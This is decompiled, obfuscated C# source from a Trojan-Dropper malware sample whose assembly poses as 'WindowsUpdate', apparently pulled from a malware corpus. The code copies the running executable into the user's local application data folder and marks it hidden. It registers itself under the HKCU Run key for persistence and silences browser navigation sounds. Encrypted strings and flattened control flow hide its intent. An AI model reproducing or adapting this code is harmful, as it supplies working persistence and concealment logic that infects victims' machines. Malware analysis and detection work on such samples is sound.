// Decompiled with JetBrains decompiler
// Type: BrowserDene.Utils
// Assembly: WindowsUpdate, Version=1.2.0.4, Culture=neutral, PublicKeyToken=null
// MVID: B59DA879-2509-4A3B-B668-95A7AF90F67D
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Dapato.bafo-fab86c80e4272c2077a8c54a594ce9d52ea6dce1425db867bf9009ba5c32af6d.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace BrowserDene
{
  internal class Utils
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static object Regkeyname;
    public static object DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Utils.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(object src, object dst)
    {
      int num = 0;
      while (true)
      {
        switch (num)
        {
          case 0:
            if (Utils.aRM1kx6IHbDgOeSaCeA(dst))
            {
              num = Utils.qFuFgy6ufpqptauiYyN() ? 3 : 4;
              continue;
            }
            break;
          case 1:
          case 4:
            Utils.KafQ5l6Os6gNKQK1i4T(dst, FileAttributes.Normal);
            break;
          case 5:
            goto label_6;
        }
        try
        {
          Utils.FDeRNB6REiP0u7kpkF5(src, dst, true);
        }
        catch (Exception ex)
        {
        }
        Utils.KafQ5l6Os6gNKQK1i4T(dst, FileAttributes.Hidden);
        num = 5;
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(object name, object path)
    {
      int num = !Utils.h9q7Os6wG7nKu8Po9nh() ? 3 : 1;
      RegistryKey registryKey;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            registryKey = (RegistryKey) Utils.xBf96w6J5QqrHweMfus((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1900), true);
            if (true)
            {
              num = 4;
              continue;
            }
            goto label_2;
          case 2:
            goto label_10;
          case 3:
            goto label_11;
          case 4:
            if (registryKey != null)
            {
              Utils.KJ1tO36s3WplrO6ASv6((object) registryKey, name, path);
              goto case 5;
            }
            else
              goto label_12;
          case 5:
            Utils.Klg3Zb6xIl12m2CI1nZ((object) registryKey);
            num = 6;
            continue;
          case 6:
            goto label_3;
          default:
            num = 5;
            continue;
        }
      }
label_2:
      return;
label_10:
      return;
label_11:
      return;
label_3:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      int num = Utils.qFuFgy6ufpqptauiYyN() ? 1 : 4;
      string str1;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 4:
            str1 = (string) Utils.J4syUa6hThcS1qw9M9Y(Utils.tPf8Ie6tBf2VpKJtANF());
            if (!Utils.qFuFgy6ufpqptauiYyN())
            {
              num = 5;
              continue;
            }
            goto case 1;
          case 1:
          case 2:
            if (!Utils.EBQf9t6m6YMcFxMsTq1(Utils.P07l1l6DIJueRlWGXRn((object) str1), (object) str2))
            {
              Utils.iJ2JBc6UYIvolZpRR0M((object) str1, Utils.zItFcq6y2V2JcFnVFDK((object) str2, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1994), Utils.DstName));
              if (true)
              {
                num = 6;
                continue;
              }
              goto case 0;
            }
            else
              goto label_5;
          case 3:
            goto label_9;
          case 5:
            str2 = (string) Utils.el67G26kuflZN9N9wBA(Environment.SpecialFolder.LocalApplicationData);
            goto case 1;
          case 6:
            goto label_1;
          default:
            num = 3;
            continue;
        }
      }
label_5:
      return;
label_1:
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Utils()
    {
      Utils.P8AVLD6V3gUPpecqdtF();
      Utils.hRJF576ph05WKJ1L5TM((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Utils()
    {
      int num = 3;
      if (Utils.h9q7Os6wG7nKu8Po9nh())
        goto label_4;
label_1:
      Utils.P8AVLD6V3gUPpecqdtF();
      num = Utils.qFuFgy6ufpqptauiYyN() ? 4 : 0;
label_4:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            Utils.Regkeyname = (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(2000);
            break;
          case 3:
            goto label_1;
          case 5:
            goto label_5;
        }
        Utils.DstName = (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(2030);
        num = 5;
      }
label_5:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool h9q7Os6wG7nKu8Po9nh() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool qFuFgy6ufpqptauiYyN() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool aRM1kx6IHbDgOeSaCeA([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void KafQ5l6Os6gNKQK1i4T([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void FDeRNB6REiP0u7kpkF5([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object xBf96w6J5QqrHweMfus([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void KJ1tO36s3WplrO6ASv6([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void Klg3Zb6xIl12m2CI1nZ([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object tPf8Ie6tBf2VpKJtANF() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object J4syUa6hThcS1qw9M9Y([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object el67G26kuflZN9N9wBA([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object P07l1l6DIJueRlWGXRn([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool EBQf9t6m6YMcFxMsTq1([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object zItFcq6y2V2JcFnVFDK([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void iJ2JBc6UYIvolZpRR0M([In] object obj0, [In] object obj1) => Utils.Copy(obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void P8AVLD6V3gUPpecqdtF() => eWK97ZHZd8El3E8K9m.Ajdu5YFzdBcjr();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void hRJF576ph05WKJ1L5TM([In] object obj0) => obj0.\u002Ector();
  }
}
